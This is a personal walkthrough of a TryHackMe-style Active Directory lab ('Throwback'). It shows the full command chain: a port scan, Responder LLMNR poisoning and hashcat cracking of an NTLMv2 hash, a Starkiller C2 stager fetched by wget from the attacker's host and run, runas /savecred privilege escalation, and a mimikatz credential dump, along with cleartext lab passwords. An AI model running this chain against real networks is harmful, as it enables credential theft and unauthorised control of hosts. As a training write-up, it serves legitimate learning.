# recon
```console
$ sudo ./pymap.py -t 10.200.11.219 -A
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 85:b8:1f:80:46:3d:91:0f:8c:f2:f2:3f:5c:87:67:72 (RSA)
|   256 5c:0d:46:e9:42:d4:4d:a0:36:d6:19:e5:f3:ce:49:06 (ECDSA)
|_  256 e2:2a:cb:39:85:0f:73:06:a9:23:9d:bf:be:f7:50:0c (ED25519)


PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THROWBACK
|   NetBIOS_Domain_Name: THROWBACK
|   NetBIOS_Computer_Name: THROWBACK-PROD
|   DNS_Domain_Name: THROWBACK.local
|   DNS_Computer_Name: THROWBACK-PROD.THROWBACK.local
|   DNS_Tree_Name: THROWBACK.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-11-02T20:40:44+00:00
| ssl-cert: Subject: commonName=THROWBACK-PROD.THROWBACK.local
| Not valid before: 2020-07-27T22:26:10
|_Not valid after:  2021-01-26T22:26:10
|_ssl-date: 2020-11-02T20:40:44+00:00; 0s from scanner time.


PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Throwback Hacks


PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found


PORT    STATE SERVICE VERSION
135/tcp open  msrpc   Microsoft Windows RPC


PORT     STATE SERVICE VERSION
5357/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable


PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn

Host script results:
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)


PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-02T20:40:47
|_  start_date: N/A


PORT      STATE SERVICE VERSION
49667/tcp open  msrpc   Microsoft Windows RPC


PORT      STATE SERVICE VERSION
49673/tcp open  msrpc   Microsoft Windows RPC


PORT      STATE SERVICE VERSION
49669/tcp open  msrpc   Microsoft Windows RPC
```

## 80/tcp open  http Microsoft IIS httpd 10.0
- TBHSecurity.com
- more Cresential -> I created a [userlist](user.md)
- /cannon.html (Status: 200) : `Squirtle's IP Cannon`


# Responder + ColabCat
The goal is caputuring a NTLMv2 hash using **LLMNR Poisoning** follow by using **ColabCat** to crack the hash


```console
$ cat /etc/responder/Responder.conf | grep SMB #if OFF change to ON
SMB = ON 
$ sudo responder -I tun0 -rdw -v
```
- r: switch enables netbios wredir suffix queries
- d: switch enables netbios domain suffix querie
- w: switch starts the wpad rogue proxy server
- v: verbose

```
[SMB] NTLMv2-SSP Client   : 10.200.11.219
[SMB] NTLMv2-SSP Username : THROWBACK\PetersJ
[SMB] NTLMv2-SSP Hash     : PetersJ::THROWBACK:c94e491a3b17cece:304BAED34201DA03AC58595F431764A7:0101000000000000C0653150DE09D201C1C570D386F8569D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000186021898C0BEA7AADD885D2BC62037F3AEC4357CD60478D18227879F9B00BC40A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E0039002E00310038000000000000000000
```
So next step is crack the hash using hash cat. THM advices us to use OneRuleToRuleThemAll.rule so `wget` it! then I ran
```
hashcat -m 5600 peter.txt rockyou.txt
 -r OneRuleToRuleThemAll.rule --debug-mode=1 --debug-file=matched.rule -o cracked.txt
```
my graphic card is super bad. I got 0.56% After 37 min.... RIP. So I decide to use [Colabcat](https://github.com/someshkar/colabcat) for the first time. To make it easier for me I watch some [youtube](https://www.youtube.com/watch?v=pYOncitu7W8) guide how to use this tool. here is what you need to do
1. Click on `Runtime`, `Change runtime type`, and set `Hardware accelerator` to GPU.
2. Go to your Google Drive and create a directory called `dothashcat`, with a `hashes` subdirectory where you can store hashes.
3. Upload [rule](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule) and your hashes in `hashes` subdirectory.
4. Come back to Google Colab, click on `Runtime` and then `Run all`.
5. When it asks for a Google Drive *token*, go to the link it provides and authenticate with your Google Account to get the token
6. add code cell (`+code`)
7. run `!bash` and press play button
8. `cd drive/'My Drive'/dothashcat/hashes` and run hashcat
```console
$ hashcat -m 5600 peter.txt rockyou.txt
 -r OneRuleToRuleThemAll.rule --debug-mode=1 --debug-file=matched.rule -o cracked.txt
```
I cant belive that it took **21** sec to crack it on **ColabCat**. Perter credential = `PetersJ:Throwback317` 

# foothold
RDP into PROD using `PetersJ:Throwback317`. grab a user flag in Desktop. Here is all users on `PROD`
```
    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/29/2020   7:05 PM                admin-petersj
d-----        8/27/2020   4:19 AM                Administrator
d-----        6/25/2020   4:13 PM                Administrator.THROWBACK
d-----         7/2/2020   1:26 AM                blairej
d-----        8/27/2020   5:10 PM                blairej.THROWBACK
d-----         7/2/2020   1:17 AM                foxxr
d-----        7/31/2020   9:18 PM                horsemanb
d-----        7/31/2020   7:38 PM                humphreyw
d-----        8/24/2020   4:53 AM                petersj
d-r---       12/12/2018   7:45 AM                Public
d-----        7/31/2020   3:48 AM                Spooks
d-----        6/25/2020   4:16 PM                WEBService
```


Now we will try to learn something wich is using **Starkiller** as our C2. Dont know how to install and setup? check [this](../../../writeUp/CheatSheet/kali-setup.md).

let's do it!!
1. set-up a http lisner
2. create a stager using `launcher_bat`
3. on kali run python http.server
4. on PROD run 
```
PS C:\Users\petersj\Downloads> wget http://10.50.9.18:8000/launcher.bat -outfile update.bat
PS C:\Users\petersj\Downloads> .\update.bat
```
5. back to our c2. check `Agent`, the new agent should pop-up. if red = no connection. black/no color = everything is good!

I ran winPEAS, not thing much there but **Anti-Virus is disable**. Now use RDP to get `seatbelt.exe` to `PROD` then run `belt.exe -group user` to enumerate the server. here are some of the important results. 

- Why RDP? 

**Because the credential manager requires a desktop session** 
```
====== WindowsAutoLogon ======

  DefaultDomainName              : 
  DefaultUserName                : BlaireJ
  DefaultPassword                : 7eQgx6YzxgG3vC45t5k9
  AltDefaultDomainName           : 
  AltDefaultUserName             : 
  AltDefaultPassword             : 
====== WindowsVault ======


  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

====== WindowsCredentialFiles ======

  Folder : C:\Users\petersj\AppData\Roaming\Microsoft\Credentials\

    FileName     : 29935E3C3E5A2088B32A3A99DB6A681C
    Description  : Enterprise Credential Data
    MasterKey    : cc892ed1-f771-45bc-9ac3-7769dbc85718
    Accessed     : 8/25/2020 2:52:57 AM
    Modified     : 8/25/2020 2:52:57 AM
    Size         : 398

    FileName     : CDBCD6BB4D9AE842039B4F1580FE8727
    Description  : Enterprise Credential Data
    MasterKey    : cc892ed1-f771-45bc-9ac3-7769dbc85718
    Accessed     : 8/25/2020 2:54:55 AM
    Modified     : 8/25/2020 2:54:55 AM
    Size         : 462
====== CredEnum ======

  Target              : localadmin.pass
  UserName            : admin-petersj
  Password            :
  CredentialType      : DomainPassword
  PersistenceType     : Enterprise
  LastWriteTime       : 8/25/2020 2:52:57 AM
```
let escalate priv to `admin-petersj`. by running `runas /savecred /user:admin-petersj /profile "cmd.exe"`
```
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
throwback-prod\admin-petersj

C:\Windows\system32>net user admin-petersj
User name                    admin-petersj
Full Name                    Jon Peters
Comment                      Local admin account for Jon
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/27/2020 4:15:44 AM
Password expires             Never
Password changeable          8/27/2020 4:15:44 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/3/2020 10:10:47 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```
BOOM! we just rooted **PROD**!! 
now let execute our `launcher_bat` so we get a presistant shell on as ADMIN too. 
```
C:\Users\petersj\Downloads>update.bat
```
now check `Starkiller` agents, We should have 2 agents, 1 as `ptersj` and `admin-petersj` Grab root flag and another user flag!! 

# dump it like it hot
let use `mimikatz` module on `Starkiller` to dump the hashes, select `powershell/credentials/mimikatz/logonpasswords` and run on Admin agent. We already know that antivirus is down when we did recon on the server so we dont not need to worry about it.


when it is done, check credentials panel. All credential that we got from mimikatz should pop up.